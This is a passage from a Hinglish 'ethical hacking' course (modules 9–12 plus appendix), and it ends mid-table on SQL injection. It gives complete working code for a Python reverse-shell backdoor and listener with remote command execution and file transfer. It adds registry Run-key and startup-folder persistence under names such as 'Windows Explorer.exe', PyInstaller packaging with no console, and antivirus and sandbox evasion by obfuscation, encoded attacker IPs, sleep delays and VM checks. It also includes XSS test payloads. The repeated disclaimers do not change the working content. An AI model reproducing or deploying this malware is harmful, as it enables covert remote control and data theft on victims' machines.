Better:** - Firewalls outgoing connections allow karte hain - NAT/Router ke
peeche bhi kaam karta hai - Detection kam hota hai ### Basic Socket Connection:
```python #!/usr/bin/env python3 import socket # Attacker Machine (Listener)
listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Line 4: TCP
socket create karo # AF_INET = IPv4, SOCK_STREAM = TCP listener.bind(("0.0.0.0",
4444)) # Line 5: Port 4444 par listen karo # 0.0.0.0 = all interfaces
listener.listen(0) # Line 6: Incoming connections accept karne ke liye ready ho
jao print("[+] Waiting for incoming connections...") connection, address =
listener.accept() # Line 8: Connection accept karo (blocking call) print(f"[+]
Got connection from {address}") ``` ```python # Victim Machine (Backdoor) import
socket connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection.connect(("10.0.2.15", 4444)) # Line 4: Attacker ke IP aur port se
connect karo connection.send(b"Connection established") # Line 5: Message bhejo
``` **Expected Output:** ```bash # Attacker: [+] Waiting for incoming
connections... [+] Got connection from ('10.0.2.7', 54321) # Victim: (silently
connects) ``` ### Hands-On Challenge: **Task:** 1. Do terminals kholo (ek
listener, ek backdoor) 2. Pehle listener run karo 3. Phir backdoor run karo 4.
Connection establish hone par message dekho 5. Netcat se bhi try karo: `nc -lvnp
4444` **Ethical Tip:** ‚ö†Ô∏è Backdoors unauthorized access ke liye use hote hain.
Yeh malware ka core component hai. Sirf authorized testing mein use karo.
Real-world mein backdoor distribute karna serious crime hai. --- ## 9.2 Complete
Backdoor with Command Execution **Source:** Pages 55-73 **Original:** ‚úì
**Added:** JSON serialization, error handling ### Line-by-Line Code Example:
**File: backdoor.py (Victim Machine)** ```python #!/usr/bin/env python3 import
socket import subprocess import json import os import base64 class Backdoor: def
__init__(self, ip, port): # Line 8: Constructor self.connection =
socket.socket(socket.AF_INET, socket.SOCK_STREAM) self.connection.connect((ip,
port)) # Lines 9-10: Attacker se connect karo def reliable_send(self, data): #
Line 12: Data bhejne ka reliable method json_data = json.dumps(data) # Line 13:
Data ko JSON mein convert karo # JSON = JavaScript Object Notation (universal
format) self.connection.send(json_data.encode()) # Line 14: JSON ko bytes mein
convert karke bhejo def reliable_receive(self): # Line 16: Data receive karne ka
reliable method json_data = "" while True: # Line 18: Loop (pura data receive
karne tak) try: json_data += self.connection.recv(1024).decode() # Line 20: 1024
bytes receive karo aur decode karo return json.loads(json_data) # Line 21: JSON
ko Python object mein convert karo except ValueError: # Line 22: Agar incomplete
JSON hai continue # Line 23: Loop continue karo (more data receive karo) def
execute_system_command(self, command): # Line 25: System command execute karo
return subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT) #
Lines 26-27: Command run karo aur output return karo # stderr=STDOUT: Errors bhi
output mein include karo def change_working_directory(self, path): # Line 29:
Directory change karo os.chdir(path) return f"[+] Changed directory to {path}"
def read_file(self, path): # Line 33: File read karo (download ke liye) with
open(path, "rb") as file: # Line 34: Binary mode mein file kholo return
base64.b64encode(file.read()) # Line 35: Base64 encode karo (JSON-safe banane ke
liye) def write_file(self, path, content): # Line 37: File write karo (upload ke
liye) with open(path, "wb") as file: file.write(base64.b64decode(content)) #
Lines 38-39: Base64 decode karke file mein write karo return "[+] Upload
successful" def run(self): # Line 42: Main loop while True: command =
self.reliable_receive() # Line 44: Command receive karo try: if command[0] ==
"exit": # Line 46: Exit command self.connection.close() exit() elif command[0]
== "cd" and len(command) > 1: # Line 49: Change directory result =
self.change_working_directory(command[1]) elif command[0] == "download": # Line
52: Download file result = self.read_file(command[1]) elif command[0] ==
"upload": # Line 55: Upload file result = self.write_file(command[1],
command[2]) else: # Line 58: Normal command result =
self.execute_system_command(command) self.reliable_send(result) # Line 60:
Result bhejo except Exception: # Line 61: Agar koi error aaye
self.reliable_send("[-] Error during command execution") # Usage my_backdoor =
Backdoor("10.0.2.15", 4444) my_backdoor.run() ``` **File: listener.py (Attacker
Machine)** ```python #!/usr/bin/env python3 import socket import json import
base64 class Listener: def __init__(self, ip, port): listener =
socket.socket(socket.AF_INET, socket.SOCK_STREAM)
listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) # Line 8: Socket
option (port reuse ke liye) listener.bind((ip, port)) listener.listen(0)
print("[+] Waiting for incoming connections...") self.connection, address =
listener.accept() print(f"[+] Got connection from {address}") def
reliable_send(self, data): json_data = json.dumps(data)
self.connection.send(json_data.encode()) def reliable_receive(self): json_data =
"" while True: try: json_data += self.connection.recv(1024).decode() return
json.loads(json_data) except ValueError: continue def execute_remotely(self,
command): self.reliable_send(command) return self.reliable_receive() def
write_file(self, path, content): # Line 35: Downloaded file ko save karo with
open(path, "wb") as file: file.write(base64.b64decode(content)) return "[+]
Download successful" def read_file(self, path): # Line 40: Upload ke liye file
read karo with open(path, "rb") as file: return base64.b64encode(file.read())
def run(self): while True: command = input(">> ") command = command.split(" ")
try: if command[0] == "upload": # Line 50: File upload karo file_content =
self.read_file(command[1]) command.append(file_content) result =
self.execute_remotely(command) if command[0] == "download" and "[-]" not in
str(result): # Line 56: File download karo result = self.write_file(command[1],
result) print(result) except Exception: print("[-] Error during command
execution") # Usage my_listener = Listener("0.0.0.0", 4444) my_listener.run()
``` **Expected Output:** ```bash # Attacker: [+] Waiting for incoming
connections... [+] Got connection from ('10.0.2.7', 54321) >> help [-] Error
during command execution >> dir Volume in drive C has no label. ... >> cd
C:\Users [+] Changed directory to C:\Users >> download passwords.txt [+]
Download successful >> upload backdoor.exe [+] Upload successful ``` ###
Hands-On Challenge: **Task:** 1. Listener aur backdoor dono run karo 2.
Different commands try karo (dir, ipconfig, whoami) 3. File download/upload test
karo 4. Screenshot capture feature add karo (PIL library use karo) **Ethical
Tip:** ‚ö†Ô∏è Complete backdoor EXTREMELY POWERFUL hai. Victim machine ka full
control mil jaata hai. Sirf authorized testing mein use karo. Unauthorized
backdoor distribution serious crime hai. --- # MODULE 10: Persistence & Stealth
**Difficulty:** Expert ‚≠ê‚≠ê‚≠ê‚≠ê‚≠ê **Pages:** 98-102 **Prerequisites:** Module 9
(Backdoors) ## What You'll Learn: Backdoor ko persistent banani seekhoge (system
restart ke baad bhi chale) aur detection se bachane ke techniques. --- ## 10.1
Windows Registry Persistence **Source:** Pages 98-102 **Original:** ‚úì **Added:**
Complete implementation with error handling ### Hinglish Explanation: **Kya hai
yeh?** Persistence - backdoor ko system startup par automatically run karna.
Registry mein entry add karke yeh achieve hota hai. **Kyun zaroori hai?** Bina
persistence ke backdoor temporary hai. System restart hone par connection khatam
ho jaayega. Real-world malware hamesha persistent hota hai. **Kab use karna?**
Authorized penetration testing mein jab tum long-term access test kar rahe ho.
**Real-world Example:** Ek APT (Advanced Persistent Threat) group company ke
network mein backdoor install karta hai. Persistence se woh months tak
undetected access maintain kar sakte hain. ### Windows Registry Run Key:
**Location:** ```
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run ``` **Yahan jo
bhi entries hain, woh system startup par run hoti hain.** ### Line-by-Line Code
Example: ```python #!/usr/bin/env python3 import os import sys import shutil
import subprocess def become_persistent(): # Line 6: Persistence achieve karne
ka function evil_file_location = os.environ["APPDATA"] + "\\Windows
Explorer.exe" # Line 7: Backdoor ko safe location par copy karne ka path #
APPDATA = C:\Users\Username\AppData\Roaming (hidden folder) # Windows
Explorer.exe = Legitimate-looking naam if not
os.path.exists(evil_file_location): # Line 8: Check karo file already exist
karti hai ya nahi shutil.copyfile(sys.executable, evil_file_location) # Line 9:
Current executable ko new location par copy karo # sys.executable = currently
running file ka path subprocess.call( 'reg add
HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run ' '/v "Windows Explorer"
/t REG_SZ /d "' + evil_file_location + '"', shell=True ) # Lines 10-14: Registry
mein entry add karo # reg add = registry add command # HKCU = HKEY_CURRENT_USER
# /v = value name ("Windows Explorer") # /t REG_SZ = type (string) # /d = data
(file path) # Backdoor class mein add karo: class Backdoor: def __init__(self,
ip, port): self.become_persistent() # Constructor mein call karo self.connection
= socket.socket(socket.AF_INET, socket.SOCK_STREAM) self.connection.connect((ip,
port)) def become_persistent(self): evil_file_location = os.environ["APPDATA"] +
"\\Windows Explorer.exe" if not os.path.exists(evil_file_location):
shutil.copyfile(sys.executable, evil_file_location) subprocess.call( 'reg add
HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run ' '/v "Windows Explorer"
/t REG_SZ /d "' + evil_file_location + '"', shell=True ) ``` **Verification:**
```bash # Registry check karo: reg query
HKCU\Software\Microsoft\Windows\CurrentVersion\Run # Output: Windows Explorer
REG_SZ C:\Users\...\AppData\Roaming\Windows Explorer.exe ``` **Testing:** 1.
Backdoor run karo 2. System restart karo 3. Backdoor automatically start hoga 4.
Listener se wapas connect ho jaayega ### Alternative: Startup Folder Method
```python def add_to_startup(): """Simpler method - Startup folder mein copy
karo""" startup_path = os.path.join( os.environ["APPDATA"],
r"Microsoft\Windows\Start Menu\Programs\Startup" ) file_name = "Windows
Update.exe" destination = os.path.join(startup_path, file_name) if not
os.path.exists(destination): shutil.copyfile(sys.executable, destination)
print(f"[+] Added to startup: {destination}") ``` ### Hands-On Challenge:
**Task:** 1. Virtual machine mein test karo (NEVER on real system!) 2. Registry
entry add karo 3. System restart karo 4. Task Manager mein process dekho 5.
Cleanup: Registry entry delete karo **Ethical Tip:** ‚ö†Ô∏è Persistence EXTREMELY
DANGEROUS hai. Yeh malware ka signature technique hai. Sirf isolated test
environment mein use karo. Real system par test karne se data loss ho sakta hai.
Antivirus detect karega aur quarantine kar dega. --- **[End of Part 4 - Modules
8-10 Complete]** **Next in Part 5 (Final):** - Module 11: Web Vulnerability
Scanner - Module 12: Bypassing Antivirus & Packaging - Appendix: Glossary,
Resources, 2025 Updates --- ## Quick Reference - Modules 8-10 **Key Libraries:**
```python pynput.keyboard # Keylogger threading # Background tasks smtplib #
Email sending socket # Network connections json # Data serialization base64 #
File encoding ``` **Key Concepts:** ```python # Keylogger listener =
pynput.keyboard.Listener(on_press=callback) # Backdoor socket.connect((ip,
port)) # Reverse connection json.dumps(data) # Serialize base64.b64encode(file)
# Encode file # Persistence os.environ["APPDATA"] # Hidden folder reg add
HKCU\...\Run # Registry entry ``` **Ethical Reminders:** ‚úÖ Sirf isolated VMs
mein test karo ‚úÖ Antivirus disable mat karo testing ke liye ‚úÖ Cleanup karo
test ke baad ‚úÖ Written authorization zaroori hai ‚ùå Real systems par NEVER test
karo ‚ùå Backdoors distribute mat karo
=============================================================
# üîê Python & Ethical Hacking - Part 5 (FINAL)
## Modules 11-12 & Appendix: Web Scanner, AV Bypass & Resources

---

# MODULE 11: Web Vulnerability Scanner
**Difficulty:** Expert ‚≠ê‚≠ê‚≠ê‚≠ê‚≠ê  
**Pages:** 110-160  
**Prerequisites:** Modules 4, 6 (Network concepts, HTTP)

## What You'll Learn:
Web applications ko scan karke vulnerabilities detect karni seekhoge - XSS, SQL Injection, file upload issues. Yeh professional security auditing ka core skill hai.

---

## 11.1 Web Crawler Implementation

**Source:** Pages 110-125  
**Original:** ‚úì  
**Added:** Complete recursive crawler

### Hinglish Explanation:

**Kya hai yeh?**  
Web Crawler - website ke saare pages automatically discover karta hai. Yeh scanner ka first step hai.

**Kyun zaroori hai?**  
Manual testing mein saare pages dhundhna mushkil hai. Crawler automatically hidden pages, admin panels, API endpoints sab discover kar leta hai.

**Kab use karna?**  
Authorized web application penetration testing mein.

**Real-world Example:**  
Ek company apni website test karna chahti hai. Crawler 500+ pages discover karta hai jisme 50 admin pages hain jo Google mein indexed nahi the.

### Line-by-Line Code Example:

```python
#!/usr/bin/env python3
import requests
import re
from urllib.parse import urljoin, urlparse

class Scanner:
    def __init__(self, url, ignore_links):
        # Line 6: Constructor
        
        self.session = requests.Session()
        # Line 7: Session object (cookies maintain karne ke liye)
        
        self.target_url = url
        self.target_links = []
        self.ignore_links = ignore_links
        # Lines 8-10: Instance variables
    
    def extract_links_from(self, url):
        # Line 12: URL se saare links extract karo
        
        response = self.session.get(url)
        # Line 13: Page download karo
        
        return re.findall(r'href=["\']?([^"\' >]+)', response.text)
        # Line 14: Regex se href links nikalo
        # Pattern: href="link" ya href='link' ya href=link
    
    def crawl(self, url=None):
        # Line 16: Recursive crawling function
        
        if url is None:
            url = self.target_url
        # Lines 17-18: First call mein target URL use karo
        
        href_links = self.extract_links_from(url)
        # Line 19: Current page ke links nikalo
        
        for link in href_links:
            # Line 20: Har link ko process karo
            
            link = urljoin(url, link)
            # Line 21: Relative links ko absolute mein convert karo
            # Example: "/admin" ‚Üí "http://site.com/admin"
            
            if "#" in link:
                link = link.split("#")[0]
            # Lines 22-23: Fragment identifiers remove karo
            # Example: "page.html#section1" ‚Üí "page.html"
            
            if self.target_url in link and link not in self.target_links:
                # Line 24: Check karo link target domain ka hai aur new hai
                
                if link not in self.ignore_links:
                    # Line 25: Ignore list mein nahi hai
                    
                    self.target_links.append(link)
                    print(link)
                    # Lines 26-27: Link add karo aur print karo
                    
                    self.crawl(link)
                    # Line 28: Recursively crawl karo (nested pages)

# Usage
target_url = "http://10.0.2.15/dvwa/"
ignore_links = ["http://10.0.2.15/dvwa/logout.php"]

scanner = Scanner(target_url, ignore_links)
scanner.crawl()
```

**Breakdown:**
- **requests.Session():** Cookies maintain karta hai (login state ke liye)
- **urljoin():** Relative URLs ko absolute mein convert karta hai
- **Recursion:** Har discovered page ko phir se crawl karta hai
- **Ignore list:** Logout links avoid karne ke liye

**Expected Output:**
```bash
python3 scanner.py

# Output:
http://10.0.2.15/dvwa/
http://10.0.2.15/dvwa/index.php
http://10.0.2.15/dvwa/vulnerabilities/xss_r/
http://10.0.2.15/dvwa/vulnerabilities/sqli/
http://10.0.2.15/dvwa/security.php
...
```

### Hands-On Challenge:

**Task:**
1. DVWA install karo (Damn Vulnerable Web App)
2. Scanner run karo
3. Discovered links count karo
4. Depth limit add karo (max 3 levels deep)
5. Results ko file mein save karo

**Ethical Tip:** ‚ö†Ô∏è Web crawling aggressive ho sakti hai. Rate limiting add karo (time.sleep). Robots.txt respect karo. Sirf authorized websites scan karo.

---

## 11.2 XSS Vulnerability Detection

**Source:** Pages 149-155  
**Original:** ‚úì  
**Added:** Multiple XSS payloads

### Hinglish Explanation:

**Kya hai yeh?**  
XSS (Cross-Site Scripting) - attacker malicious JavaScript inject karta hai jo victim ke browser mein execute hoti hai.

**Kyun zaroori hai?**  
XSS se cookies steal ho sakte hain, phishing attacks ho sakte hain, malware distribute ho sakta hai. OWASP Top 10 mein hai.

**Kab use karna?**  
Web application security testing mein.

**Real-world Example:**  
Facebook mein XSS vulnerability mili thi jo $20,000 bug bounty mein convert hui. Attacker victim ke account access kar sakta tha.

### Line-by-Line Code Example:

```python
class Scanner:
    # ... (previous code)
    
    def extract_forms(self, url):
        # Line 3: Page se saare forms extract karo
        
        response = self.session.get(url)
        from bs4 import BeautifulSoup
        parsed_html = BeautifulSoup(response.content, "html.parser")
        # Lines 4-6: HTML parse karo
        
        return parsed_html.findAll("form")
        # Line 7: Saare <form> tags return karo
    
    def submit_form(self, form, value, url):
        # Line 9: Form submit karo with test payload
        
        action = form.get("action")
        post_url = urljoin(url, action)
        # Lines 10-11: Form action URL nikalo
        
        method = form.get("method")
        # Line 12: GET ya POST?
        
        inputs_list = form.findAll("input")
        post_data = {}
        # Lines 13-14: Input fields nikalo
        
        for input_field in inputs_list:
            input_name = input_field.get("name")
            input_type = input_field.get("type")
            input_value = input_field.get("value")
            # Lines 16-18: Input details nikalo
            
            if input_type == "text":
                post_data[input_name] = value
            # Lines 19-20: Text fields mein payload inject karo
        
        if method == "post":
            return self.session.post(post_url, data=post_data)
        else:
            return self.session.get(post_url, params=post_data)
        # Lines 21-24: Form submit karo
    
    def test_xss_in_form(self, form, url):
        # Line 26: XSS test karo form mein
        
        xss_test_script = "<script>alert('XSS')</script>"
        # Line 27: Test payload
        
        response = self.submit_form(form, xss_test_script, url)
        # Line 28: Payload submit karo
        
        if xss_test_script in response.content.decode():
            # Line 29: Check karo payload response mein hai ya nahi
            return True
        # Line 30: Vulnerable hai!
    
    def test_xss_in_link(self, url):
        # Line 32: URL parameters mein XSS test karo
        
        xss_test_script = "<script>alert('XSS')</script>"
        url = url.replace("=", f"={xss_test_script}")
        # Lines 33-34: Parameter value ko payload se replace karo
        # Example: page.php?name=test ‚Üí page.php?name=<script>...
        
        response = self.session.get(url)
        return xss_test_script in response.content.decode()
        # Lines 35-36: Check karo vulnerable hai ya nahi
    
    def run_scanner(self):
        # Line 38: Main scanner function
        
        for link in self.target_links:
            # Line 39: Har discovered link ko test karo
            
            forms = self.extract_forms(link)
            for form in forms:
                print(f"[*] Testing form in {link}")
                is_vulnerable = self.test_xss_in_form(form, link)
                if is_vulnerable:
                    print(f"[!] XSS discovered in {link}")
            # Lines 40-45: Forms test karo
            
            if "=" in link:
                print(f"[*] Testing {link}")
                is_vulnerable = self.test_xss_in_link(link)
                if is_vulnerable:
                    print(f"[!] XSS discovered in {link}")
            # Lines 46-50: URL parameters test karo

# Usage
scanner = Scanner("http://10.0.2.15/dvwa/", [])
scanner.session.post("http://10.0.2.15/dvwa/login.php", 
                     data={"username": "admin", "password": "password"})
scanner.crawl()
scanner.run_scanner()
```

**Expected Output:**
```bash
[*] Testing form in http://10.0.2.15/dvwa/vulnerabilities/xss_r/
[!] XSS discovered in http://10.0.2.15/dvwa/vulnerabilities/xss_r/

[*] Testing http://10.0.2.15/dvwa/vulnerabilities/xss_r/?name=test
[!] XSS discovered in http://10.0.2.15/dvwa/vulnerabilities/xss_r/?name=test
```

### Hands-On Challenge:

**Task:**
1. DVWA mein XSS (Reflected) page kholo
2. Scanner run karo
3. Manually verify karo (browser mein payload try karo)
4. Different payloads add karo: `<img src=x onerror=alert(1)>`
5. False positives filter karo

**Ethical Tip:** ‚ö†Ô∏è XSS testing se website crash ho sakti hai. Rate limiting add karo. Sirf test payloads use karo (alert boxes). Real attacks mat karo.

---

# MODULE 12: Bypassing Antivirus & Packaging
**Difficulty:** Expert ‚≠ê‚≠ê‚≠ê‚≠ê‚≠ê  
**Pages:** 90-109  
**Prerequisites:** Module 9 (Backdoors)

## What You'll Learn:
Backdoor ko executable mein convert karna aur antivirus se bachane ke techniques. Yeh real-world deployment ke liye zaroori hai.

---

## 12.1 PyInstaller - Python to EXE

**Source:** Pages 90-93  
**Original:** ‚úì  
**Added:** Cross-platform packaging

### Hinglish Explanation:

**Kya hai yeh?**  
PyInstaller - Python scripts ko standalone executables mein convert karta hai. Victim machine par Python install nahi chahiye.

**Kyun zaroori hai?**  
Real-world mein victim ke paas Python nahi hota. EXE file double-click se run ho jaati hai.

**Kab use karna?**  
Jab tum production-ready tool deliver kar rahe ho.

**Real-world Example:**  
Ek pentester client ko backdoor demo dena chahta hai. PyInstaller se EXE banake USB drive mein deta hai - client directly run kar sakta hai.

### Commands:

```bash
# Basic conversion
pyinstaller backdoor.py

# Single file (recommended)
pyinstaller --onefile backdoor.py

# No console window (stealth)
pyinstaller --onefile --noconsole backdoor.py

# Add icon
pyinstaller --onefile --noconsole --icon=icon.ico backdoor.py

# Add data files
pyinstaller --onefile --add-data "config.txt:." backdoor.py
```

**Output Structure:**
```
dist/
  ‚îî‚îÄ‚îÄ backdoor.exe  (Final executable)
build/
  ‚îî‚îÄ‚îÄ (Temporary files)
backdoor.spec
  ‚îî‚îÄ‚îÄ (Build configuration)
```

### Cross-Platform Packaging:

**Windows EXE (from Linux using Wine):**
```bash
# Install Wine
sudo apt install wine

# Install Windows Python in Wine
wine python-3.9.0.exe

# Install PyInstaller in Wine
wine python -m pip install pyinstaller

# Create EXE
wine ~/.wine/drive_c/Python39/Scripts/pyinstaller.exe --onefile backdoor.py
```

**Linux Executable:**
```bash
pyinstaller --onefile backdoor.py
# Output: dist/backdoor (Linux binary)
```

**macOS App:**
```bash
pyinstaller --onefile --windowed backdoor.py
# Output: dist/backdoor.app
```

### Hands-On Challenge:

**Task:**
1. Simple backdoor ko EXE mein convert karo
2. File size check karo (usually 5-10 MB)
3. Victim VM mein test karo
4. Icon add karo (legitimate-looking)
5. UPX compression try karo: `pyinstaller --onefile --upx-dir=/path/to/upx`

**Ethical Tip:** ‚ö†Ô∏è EXE files distribute karna illegal hai bina authorization ke. Sirf authorized testing mein use karo. VirusTotal par NEVER upload karo (signatures leak ho jaate hain).

---

## 12.2 Bypassing Antivirus Detection

**Source:** Pages 107-109  
**Original:** Partially mentioned  
**Added:** Complete AV bypass techniques

### Hinglish Explanation:

**Kya hai yeh?**  
Antivirus bypass - code ko modify karke detection avoid karna. Yeh cat-and-mouse game hai.

**Kyun zaroori hai?**  
Bina AV bypass ke backdoor useless hai. Modern antivirus 99% Python backdoors detect kar lete hain.

**Kab use karna?**  
Authorized red team engagements mein jab tum real-world scenarios simulate kar rahe ho.

**Real-world Example:**  
Ek APT group custom backdoor banata hai jo 0-day techniques use karta hai. Antivirus detect nahi kar pata kyunki signatures nahi hain.

### AV Detection Methods:

| Method | Description | Bypass Technique |
|--------|-------------|------------------|
| **Signature-based** | Known malware patterns match karta hai | Code obfuscation, encryption |
| **Heuristic** | Suspicious behavior detect karta hai | Legitimate-looking code, delays |
| **Sandbox** | Isolated environment mein run karke test karta hai | Sleep delays, environment checks |
| **Machine Learning** | AI-based detection | Unique code patterns, polymorphism |

### Bypass Techniques:

**1. Code Obfuscation:**
```python
# Before (Detectable):
import socket
connection = socket.socket()
connection.connect(("10.0.2.15", 4444))

# After (Less Detectable):
import socket as s
c = s.socket(s.AF_INET, s.SOCK_STREAM)
c.connect((chr(49)+chr(48)+".0.2.15", 4444))
```

**2. String Encoding:**
```python
# Before:
attacker_ip = "10.0.2.15"

# After:
import base64
attacker_ip = base64.b64decode("MTAuMC4yLjE1").decode()
```

**3. Delayed Execution:**
```python
import time

# Sleep for 60 seconds (sandbox timeout)
time.sleep(60)

# Then execute malicious code
import socket
# ... backdoor code
```

**4. Environment Checks:**
```python
import os
import sys

# Check if running in VM
def is_vm():
    vm_indicators = [
        "VMware", "VirtualBox", "QEMU", "Xen"
    ]
    
    for indicator in vm_indicators:
        if indicator.lower() in os.popen("systeminfo").read().lower():
            return True
    return False

# Exit if VM detected (sandbox evasion)
if is_vm():
    sys.exit()
```

**5. PyArmor Encryption:**
```bash
# Install PyArmor
pip install pyarmor

# Encrypt Python code
pyarmor obfuscate backdoor.py

# Output: dist/backdoor.py (encrypted)
```

### Testing Against Antivirus:

**‚ö†Ô∏è NEVER use VirusTotal for real backdoors!**

**Safe Testing Methods:**
1. **Local AV Testing:** Apne VM mein antivirus install karo
2. **Antiscan.me:** Private scanning service (signatures share nahi karta)
3. **NoDistribute.com:** Similar to antiscan

### Hands-On Challenge:

**Task:**
1. Basic backdoor banao
2. Windows Defender se test karo (detect hoga)
3. PyArmor se encrypt karo
4. Phir se test karo (detection kam hoga)
5. Sleep delays add karo
6. Final test karo

**Ethical Tip:** ‚ö†Ô∏è AV bypass techniques dual-use hain. Yeh legitimate security testing ke liye hain, malware distribution ke liye NAHI. Unauthorized use serious crime hai.

---

# APPENDIX: Resources & Glossary

## A. Glossary (Hinglish)

**ARP (Address Resolution Protocol):**  
IP address ko MAC address se map karta hai. Network ke andar communication ke liye zaroori.

**Backdoor:**  
Ek program jo attacker ko unauthorized access deta hai. Firewall aur authentication bypass kar sakta hai.

**Base64:**  
Binary data ko text format mein encode karne ka method. Files ko JSON mein bhejne ke liye use hota hai.

**Bind Shell:**  
Victim machine port open karta hai, attacker connect karta hai. Firewall block kar deta hai (outdated).

**Brute Force:**  
Saare possible combinations try karna (passwords, PINs, etc.). Time-consuming lekin effective.

**DNS (Domain Name System):**  
Domain names ko IP addresses mein convert karta hai. Internet ka phone book.

**Exploit:**  
Vulnerability ko use karke unauthorized access lena. Zero-day exploit sabse dangerous hai.

**Firewall:**  
Network traffic filter karta hai. Incoming connections block kar sakta hai.

**JSON (JavaScript Object Notation):**  
Data exchange format. Python dictionaries ko network par bhejne ke liye use hota hai.

**Keylogger:**  
Keyboard strokes record karta hai. Passwords, credit cards capture kar sakta hai.

**MAC Address:**  
Hardware address (6 octets). Network ke andar devices identify karne ke liye.

**MITM (Man-in-the-Middle):**  
Attacker beech mein aake traffic intercept karta hai. ARP spoofing se possible hai.

**Payload:**  
Malicious code jo exploit deliver karta hai. Backdoor, keylogger, ransomware ho sakta hai.

**Persistence:**  
System restart ke baad bhi access maintain karna. Registry, startup folder use hota hai.

**Phishing:**  
Fake websites/emails se credentials steal karna. Social engineering attack.

**Reverse Shell:**  
Victim attacker se connect karta hai. Firewall bypass ho jaata hai (modern method).

**Scapy:**  
Python library for packet manipulation. Network attacks ke liye powerful tool.

**Socket:**  
Network communication endpoint. TCP/UDP connections ke liye use hota hai.

**XSS (Cross-Site Scripting):**  
Malicious JavaScript inject karna. Cookies steal, phishing, malware distribution possible hai.

---

## B. Essential Resources

### Learning Platforms:
1. **HackTheBox** (hackthebox.eu) - Hands-on hacking labs
2. **TryHackMe** (tryhackme.com) - Beginner-friendly challenges
3. **PentesterLab** (pentesterlab.com) - Web security focus
4. **OverTheWire** (overthewire.org) - Wargames for beginners

### Bug Bounty Programs:
1. **HackerOne** (hackerone.com) - Top bug bounty platform
2. **Bugcrowd** (bugcrowd.com) - Crowdsourced security
3. **Synack** (synack.com) - Private bug bounty
4. **Intigriti** (intigriti.com) - European focus

### Documentation:
1. **OWASP Top 10** - Web vulnerabilities list
2. **Kali Linux Docs** - Tool documentation
3. **Python Docs** - Official Python reference
4. **Scapy Docs** - Packet manipulation guide

### Practice Environments:
1. **DVWA** - Damn Vulnerable Web Application
2. **Metasploitable** - Vulnerable Linux VM
3. **WebGoat** - OWASP training app
4. **bWAPP** - Buggy Web Application

---

## C. 2025 Updates & Best Practices

### Security Updates:
1. **Gmail:** App Passwords mandatory (2FA required)
2. **Python:** Use Python 3.9+ (security patches)
3. **Scapy:** Install scapy-python3 for Python 3
4. **Antivirus:** AI-based detection common (obfuscation zaroori)

### Best Practices:
1. **Always use virtual machines** for testing
2. **Never test on production systems** without authorization
3. **Document everything** in penetration testing reports
4. **Responsible disclosure** - vulnerabilities privately report karo
5. **Keep learning** - security landscape constantly changes

### Legal Compliance:
1. **Written authorization** zaroori hai
2. **Scope document** clearly define karo
3. **Data protection** laws follow karo (GDPR, etc.)
4. **Insurance** consider karo (professional liability)

---

## D. Course Summary

**Total Modules Covered:** 12  
**Total Techniques:** 50+  
**Difficulty Range:** Beginner ‚Üí Expert  

**Key Skills Learned:**
‚úÖ Python programming for security  
‚úÖ Network scanning & reconnaissance  
‚úÖ MITM attacks (ARP/DNS spoofing)  
‚úÖ Packet sniffing & analysis  
‚úÖ Keylogger development  
‚úÖ Backdoor creation & deployment  
‚úÖ Persistence techniques  
‚úÖ Web vulnerability scanning  
‚úÖ Antivirus bypass methods  

**Career Paths:**
- Penetration Tester
- Security Analyst
- Bug Bounty Hunter
- Red Team Operator
- Security Researcher

---

## E. Final Ethical Reminder

**üö® YAAD RAKHO - BAHUT ZAROORI! üö®**

Yeh course tumhe powerful skills sikhata hai. Power ke saath responsibility bhi aati hai.

**Legal Use:**
‚úÖ Authorized penetration testing  
‚úÖ Bug bounty programs  
‚úÖ Personal lab environments  
‚úÖ Educational purposes  
‚úÖ Security research (responsible disclosure)  

**Illegal Use:**
‚ùå Unauthorized network access  
‚ùå Data theft  
‚ùå Malware distribution  
‚ùå DDoS attacks  
‚ùå Identity theft  

**Consequences:**
- **IT Act 2000:** 3 years jail + heavy fine
- **IPC Section 66:** Unauthorized computer access
- **Career destruction:** Criminal record
- **Civil lawsuits:** Damages payment

**Remember:**
> "With great power comes great responsibility"

Ethical hacking ka matlab hai **permission ke saath** testing karna. Bina permission ke yeh sab **hacking** hai, **ethical hacking** nahi.

---

## F. Next Steps

**Beginner Level:**
1. Python basics master karo
2. Networking fundamentals samjho
3. Linux command line sikho
4. Virtual lab setup karo

**Intermediate Level:**
1. OWASP Top 10 study karo
2. Metasploit framework sikho
3. Burp Suite use karo
4. CTF challenges solve karo

**Advanced Level:**
1. Custom exploits likho
2. 0-day research karo
3. Bug bounties mein participate karo
4. Security conferences attend karo

**Certifications:**
- **CEH** (Certified Ethical Hacker)
- **OSCP** (Offensive Security Certified Professional)
- **GPEN** (GIAC Penetration Tester)
- **eWPT** (eLearnSecurity Web Penetration Tester)

---

**[END OF COMPLETE COURSE]**

**Course Statistics:**
- **Total Pages:** ~280
- **Total Modules:** 12
- **Code Examples:** 100+
- **Hands-On Challenges:** 50+
- **Real-World Examples:** 60+

**Thank you for learning! Stay ethical, stay legal, stay curious! üîêüöÄ**

---

## Quick Command Reference

```bash
# Network
ifconfig / ipconfig
arp -a
netstat -an

# Python
python3 script.py
pip3 install package

# Scapy
sudo python3 script.py  # Root required

# PyInstaller
pyinstaller --onefile script.py

# Testing
nc -lvnp 4444  # Netcat listener
curl -X POST url -d "data"  # HTTP POST
```

**Happy Ethical Hacking! üéØ**

=============================================================

# üîê Advanced Modules 11-12: Complete Web Scanner & AV Bypass

---

# MODULE 11: Complete Web Vulnerability Scanner
**Difficulty:** Expert ‚≠ê‚≠ê‚≠ê‚≠ê‚≠ê  
**Pages:** 156-160 (Extended)

## 11.3 SQL Injection Detection

**Source:** NEW - Missing from original  
**Added:** Complete SQL injection scanner

### Hinglish Explanation:

**Kya hai yeh?**  
SQL Injection - database queries mein malicious SQL code inject karna. Attacker pura database access kar sakta hai.

**Kyun zaroori hai?**  
OWASP Top 10 mein #1 vulnerability. Banking sites, e-commerce, social media sab vulnerable ho sakte hain.

**Kab use karna?**  
Web application penetration testing mein.

**Real-world Example:**  
2012 mein Yahoo Voices hack hua - 450,000 passwords leak hue SQL injection se. Bug bounty mein $5,000-$15,000 milte hain.

### SQL Injection Types:

| Type | Description | Example |
